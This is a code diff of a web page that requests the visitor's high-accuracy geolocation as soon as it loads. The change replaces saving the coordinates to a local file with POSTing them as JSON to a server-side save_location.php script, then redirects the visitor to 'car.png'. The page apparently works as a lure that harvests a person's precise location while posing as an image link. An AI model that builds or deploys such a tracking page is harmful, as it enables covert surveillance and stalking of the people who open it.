@@ -10,7 +10,7 @@
     
     <script>
         // Function to get the visitor's location
-        async function getLocation() {
+        function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(savePosition, errorHandler, { enableHighAccuracy: true });
             } else {
@@ -23,31 +23,39 @@
             console.log("Error getting location:", error.message);
         }
 
-        // Function to save the visitor's location in a text file
-        async function savePosition(position) {
+        // Function to save the visitor's location in JSON format and redirect
+        function savePosition(position) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
             console.log("Latitude: " + latitude + " Longitude: " + longitude);
 
-            // Create a string with the location data
-            var locationData = "Latitude: " + latitude + "\nLongitude: " + longitude;
+            // Create a JavaScript object with the location data
+            var locationData = {
+                latitude: latitude,
+                longitude: longitude
+            };
 
-            try {
-                // Request access to the file system
-                const fileHandle = await window.showSaveFilePicker();
-                const writable = await fileHandle.createWritable();
-                
-                // Write the location data to the text file
-                await writable.write(locationData);
-                await writable.close();
+            // Convert the object to JSON format
+            var jsonData = JSON.stringify(locationData);
 
-                console.log("Location data saved to file:", fileHandle.name);
-            } catch (err) {
-                console.error("Error saving location data:", err);
-            }
-
-            // Redirect to "car.png"
-            window.location.href = "car.png";
+            // Send the JSON data to the PHP script using Fetch API
+            fetch('save_location.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: jsonData
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Location data saved successfully.');
+                    // Redirect to "car.png"
+                    window.location.replace("car.png");
+                } else {
+                    console.log('Error saving location data:', response.status);
+                }
+            }).catch(error => {
+                console.error('Error saving location data:', error);
+            });
         }
 
         // Call the getLocation function when the page loads
